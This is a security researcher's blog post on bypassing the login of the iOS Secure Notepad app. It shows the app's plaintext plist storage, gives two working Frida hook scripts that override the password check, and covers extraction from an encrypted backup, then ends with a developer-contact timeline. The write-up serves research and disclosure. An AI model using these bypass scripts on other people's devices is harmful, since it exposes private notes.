---
layout: post
title: Not-So Secure Notepad
---

![Untitled](/assets/blinko.jpeg)

Lately I have been interested in iOS applications that boast the use of password protection and use some form of encryption with a local database. This stems from blogs such as [D20 Forensics](https://blog.d204n6.com/) and [Forensic Mike](https://www.forensicmike1.com/) peaking my interest in how to bypass “encrypted” security controls. 

Some of the applications I have stumbled on are simple in design using minimal security features. Either hiding the password to access the data in a local file or in a database of some kind. Which could be easily obtained via a jailbroken device or pulled from an iPhone backup. One application in particular is the Secure Notepad application. I found this while browsing the App Store one evening and decided to give myself the objective to reverse it. 

### File System Monitoring

Typically I like to start my research and testing using [fsmon](https://github.com/nowsecure/fsmon), this is helpful to get a basic lay of the land. Giving me an idea of what the application may do on start in the private app directory on the OS or any changes made while using the app. Such as monitoring file creation, update, or deletion. During installation and setup of the app I noticed plist file being updated during the creation of the login screen password. 

### Local File System Analysis

Using a jailbroken device I ssh’ed into the iPhone and zip all folders located in the private application directory. Then used sftp to pull this zip file locally to my test laptop and begun analysis locally of the unzipped file.

The application uses a plist file to hold all the note contents, login passwords, and security questions.  

![Untitled](/assets/nsosecure.png)

### Bypassing the Password and Security Question

**Change plist Values**

The first method I decided to try was manually changing the password value found in the plist file. The file responsible for storing the password during setup is the notesdb.plist file. So I pulled the file off the iPhone device to my test laptop. 

Using vscode I updated the answer and password string values in the plist xml file. To *All your base* and *n0psn0ps* respectively. 

![Untitled](/assets/nsosecure%201.png)

Once these had been updated I save the file as notesdb.plist and pushed the updated file to the device.

![Untitled](/assets/nsosecure%202.png)

Then I closed the app and reopened it so the new plist file would be loaded into the state of the application. Then logged in using my new password and attempted to use my new security question answer. 

![Untitled](/assets/nsosecure%203.png)

### **Bypass with Runtime Instrumentation**

*Method 1: Overwrite the Password*

I am first interested in bypassing the password login functionality. Now this could be done in a couple ways, but I would like to start with overwriting the password value in the plist file. I started by tracing the method responsible for this operation using `frida-trace`. The following class and method `DBManager returnSettingForKey:` will have the function we are interested in modifying. I loaded the mach-o binary into Ghidra and started looking into the function involved in making the comparison between the string set in the UI and the value of our plist file. Below is a quick screenshot of this method in Ghidra.

![Untitled](/assets/nsosecure%204.png)

Now that I have established the correct method I need to iterated through each of these functions. Below is the method `returnSettingForKey:` source from Ghidra and a short description of each function. 

```jsx
/* Function Stack Size: 0x18 bytes */

ID DBManager::returnSettingForKey:(ID param_1,SEL param_2,ID param_3)

{
  undefined8 uVar1;
  undefined8 uVar2;
  undefined8 uVar3;
  ID IVar4;
  undefined8 extraout_x1;
  undefined auVar5 [16];
  
  uVar1 = _objc_retain(param_3);
  uVar2 = _objc_alloc(&_OBJC_CLASS_$_NSMutableDictionary);
// location of the db file or plist file loaded into param_1
  FUN_100018300(param_1);
  auVar5 = _objc_retainAutoreleasedReturnValue();
// uVar2 will be loaded with the contents of the file to key and string values
  uVar2 = FUN_100018640(uVar2,auVar5._8_8_,auVar5._0_8_);
  _objc_release(auVar5._0_8_);
// will be the object key set by us
  FUN_100018d40(uVar2,extraout_x1,uVar1);
  uVar3 = _objc_retainAutoreleasedReturnValue();
  _objc_release(uVar1);
  _objc_release(uVar2);
// value of uVar3 set to IVar4
  IVar4 = _objc_autoreleaseReturnValue(uVar3);
  return IVar4;
}
```

If I hook into this function during the onLeave call made inside my frida script I can overwrite the string value and change it to any password I like. Then use my new password to login and view the data of the Notepad. This will not alter the data inside each note file leaving the initial data intact.

```objectivec
if (ObjC.available) {
    var className = "DBManager";
    var methodName = "returnSettingForKey:";
    var DBManager = ObjC.classes[className];

    if (DBManager && DBManager[methodName]) {
        var method = DBManager['+ ' + methodName];
        Interceptor.attach(method.implementation, {
            onEnter: function (args) {
                console.log("Entering " + className + " " + methodName);
                console.log("Argument: " + ObjC.Object(args[2]).toString());
            },
            onLeave: function (retval) {
                console.log("Original Return value: " + ObjC.Object(retval).toString());

                // Modify the return value to password of choice
                var newRetVal = ObjC.classes.NSString.stringWithString_("n0ps");
                retval.replace(newRetVal);
                
                console.log("Modified Return value: " + newRetVal.toString());
            }
        });
    } else {
        console.log("Method not found: + " + methodName);
    }
} else {
    console.error("Objective-C runtime is not available.");
}
```

![Untitled](/assets/nsosecure%205.png)

*Method 2: Always Return True*

Below is the decompiled class and method we need to reverse. Various functions are present in this method noted by the commends I made in the decompiled objective-c code.  

```objectivec
/* Function Stack Size: 0x18 bytes */

void LoginViewController::passwordEnteredAction:(ID param_1,SEL param_2,ID param_3)

{
  int iVar1;
  undefined8 uVar2;
  undefined8 extraout_x1;
  undefined auVar3 [16];
  undefined auVar4 [16];
  
// function for the password field
  FUN_100018e20();
  uVar2 = _objc_retainAutoreleasedReturnValue();
// function for the text value
  FUN_10001a160();
  auVar3 = _objc_retainAutoreleasedReturnValue();
// function for the password value found in the plist file
  FUN_100019280(&objc::class_t::DBManager,auVar3._8_8_,&cf_password);
  auVar4 = _objc_retainAutoreleasedReturnValue();
// value responible for doing the equals operation for the submitted password
  iVar1 = FUN_100018860(auVar3._0_8_,auVar4._8_8_,auVar4._0_8_);
  _objc_release(auVar4._0_8_);
  _objc_release(auVar3._0_8_);
  _objc_release(uVar2);
  if (iVar1 != 0) {
    FUN_100017d60(param_1);
    return;
  }
  FUN_100019de0(param_1,extraout_x1,&cf_Wrongpassword,&cf_Error);
  FUN_100018e20(param_1);
  auVar3 = _objc_retainAutoreleasedReturnValue();
  FUN_100019c40(auVar3._0_8_,auVar3._8_8_,0);
  _objc_release(auVar3._0_8_);
  return;
}
```

Our main function of interest is `FUN_100018860` which does our comparison of Var3 and Var4. This comparison is of the password saved in the plist file and the user supplied password. Using the `isEqualToString:` method in the `NSString` class.

![Untitled](/assets/nsosecure%206.png)

If you are interested in learning more about this method you can read the Apple docs [here](https://developer.apple.com/documentation/foundation/nsstring/1407803-isequaltostring). Basically we want this to always return true. So we need to hook into this method in our application during runtime and replace the value with 0x1.  Below is our frida script.

```objectivec
const NSString = ObjC.classes.NSString;
 
// Check if the class and method exist
if (NSString && NSString['- isEqualToString:']) {
    // Hook into 'isEqualToString' method of NSString
    Interceptor.attach(NSString['- isEqualToString:'].implementation, {
        onEnter: function (args) {
            var otherString = new ObjC.Object(args[2]);
            console.log(`isEqualToString called with argument: ${otherString.toString()}`);
        },
        onLeave: function (retval) {
            console.log(`Original isEqualToString returned: ${retval}`);
            // Modify return value to always be true (YES in Objective-C)
            retval.replace(ptr("0x1"));
            console.log(`Modified isEqualToString to return true`);
        }
    });
 
    console.log('NSString isEqualToString method hooked and modified.');
} else {
    console.error('NSString or isEqualToString method not found.');
}
```

![Untitled](/assets/nsosecure%207.png)

### Dealing with Backups

Secondly another possibly way of obtaining detailed information inside of the applications private directory is creating a backup of the iOS device using finder. I created a fully encrypted backup using Finder.

![Untitled](/assets/nsosecure%208.png)

We can easily decrypt that backup using [mvt](https://docs.mvt.re/en/latest/) and begin analyzing the data locally.

![Untitled](/assets/nsosecure%209.png)

Once the backup has been unpacked and decrypted I used `grep` to search for the notesdb keyword in the back up directory.

![Untitled](/assets/nsosecure%2010.png)

We can locate the plist file saved in with the following title. 

![Untitled](/assets/nsosecure%2011.png)

That is pretty much it, I wanted to take two approaches to this scenario and see how I could bypass the password login functionality in the app. 

I attempted to contact the developer [here](https://dfidev.com/index/0-3) to give them notice that I will be publishing a blog post on the research I have done. 

![Untitled](/assets/nsosecure%2012.png)

### Contact Timeline

- November 23rd 2023 - Contact Support form 1st message sent, no response.
- November 30th 2023 - Contact Support form 2nd message sent, no response.
- December 5th 2023 - Contact Support form 3rd message sent, no response.
- January 11th 2024 - Contact Support form 4th message sent, no response.
- February 2024 - Blog post published.
